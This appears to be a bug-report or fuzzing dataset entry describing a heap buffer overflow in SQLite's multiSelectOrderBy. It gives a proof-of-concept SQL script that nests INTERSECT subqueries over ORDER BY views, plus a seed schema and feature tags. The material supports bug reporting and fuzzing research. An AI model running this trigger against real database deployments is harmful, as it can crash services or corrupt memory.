title: Heap Buffer Overflow in multiSelectOrderBy
poc:
release version.

POC:
---
CREATE TABLE a(b);
CREATE VIEW c(d) AS SELECT b FROM a ORDER BY b;
SELECT sum(d) OVER( PARTITION BY(SELECT 0 FROM c JOIN a WHERE b =(SELECT b INTERSECT SELECT d FROM c) AND b = 123)) FROM c;
CREATE VIEW t5 AS SELECT c3 FROM t3 ORDER BY c4;
SELECT * FROM t1, t2 WHERE c1=(SELECT 123 INTERSECT SELECT c2 FROM t5) AND c1=123;
key_bug_features: SELECT with INTERSECT and ORDER BY in views
bug_features_seed: CREATE TABLE users(id INTEGER PRIMARY KEY, name TEXT, age INTEGER, salary REAL);
INSERT INTO users(name, age, salary) VALUES('Alice', 30, 50000.00), ('Bob', NULL, 60000.00), ('Charlie', 25, 70000.00);
CREATE TABLE departments(id INTEGER PRIMARY KEY, dept_name TEXT);
CREATE VIEW user_salaries AS SELECT age, salary FROM users ORDER BY salary;
